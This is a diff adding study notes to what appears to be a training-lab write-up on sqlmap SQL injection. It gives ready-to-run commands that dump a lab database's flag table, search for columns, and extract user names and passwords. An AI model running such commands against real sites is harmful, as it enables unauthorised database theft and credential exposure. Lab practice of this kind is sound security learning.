@@ -125,7 +125,39 @@ From the Command:
 
 # Database Enumeration
 
+Database enumaration requires the knowledge of how to use flags in your command. The `man sqlmap` and `sqlmap --help` can be of help with this.
 
+Questions
+
+`1. What's the contents of table flag1 in the testdb database? (Case #1)`
+
+This challenge requires to know the names of the Database containing the table in question and the Database schema type being used
+
+`sqlmap -u 'http://83.136.248.62:52853/case1.php?id=1' -T flag1 --dump --batch --risk 3 --level 5 --dbms MYSQL -D testdb`
+
+# Advanced Database Enumeration
+
+Question
+
+`1. What's the name of the column containing "style" in it's name? (Case #1)`
+
+After looking into the sqlmap manual page we should now know what flag to use in order to get contents of the 'style' column
+
+`sqlmap -u 'http://83.136.248.62:52853/case1.php?id=1' --batch --search -C "style"`
+
+From the command: 
+
+    --search -C - Used to search for databases, tables, and columns of interest. The -C flag represents columns.
+
+`2. What's the Kimberly user's password? (Case #1)`
+
+`sqlmap -u 'http://83.136.248.62:52853/case1.php?id=1' --dump --batch --columns -C name,password -T users`
+
+ From the command:
+
+    --column - Lists the columns specified
+
+# Bypassing Web Application Protections
 
 
 
